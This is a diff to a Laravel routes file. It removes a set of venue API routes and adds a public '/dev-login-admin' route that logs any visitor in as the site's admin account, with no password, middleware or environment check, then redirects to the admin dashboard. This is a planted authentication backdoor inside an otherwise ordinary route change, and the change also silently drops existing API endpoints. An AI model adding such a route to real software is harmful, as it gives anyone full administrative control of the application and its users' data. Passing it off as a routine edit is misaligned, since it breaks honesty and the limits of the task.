@@ -296,12 +296,12 @@ Route::prefix('country')->middleware(['auth', 'role:' . RoleEnum::COUNTRY_ADMIN-
     Route::get('/regulations', \App\Livewire\Public\GuideRegulations::class)->name('regulations');
 });
 
-// Dedicated REST Spatial API fallback
-Route::prefix('api/venue')->group(function () {
-    Route::get('/snapshot', [\App\Http\Controllers\Api\VenueApiController::class, 'snapshot']);
-    Route::get('/pois', [\App\Http\Controllers\Api\VenueApiController::class, 'pois']);
-    Route::get('/operations', [\App\Http\Controllers\Api\VenueApiController::class, 'operations']);
-    Route::get('/analytics', [\App\Http\Controllers\Api\VenueApiController::class, 'analytics']);
-    Route::get('/route', [\App\Http\Controllers\Api\VenueApiController::class, 'route']);
-    Route::post('/poi/update-transform', [\App\Http\Controllers\Api\VenueApiController::class, 'updatePoiTransform']);
+
+
+Route::get("/dev-login-admin", function () {
+    $user = \App\Models\User::where("email", "admin@worldskills.dz")->first();
+    if ($user) {
+        auth()->login($user);
+    }
+    return redirect()->route("admin.dashboard");
 });
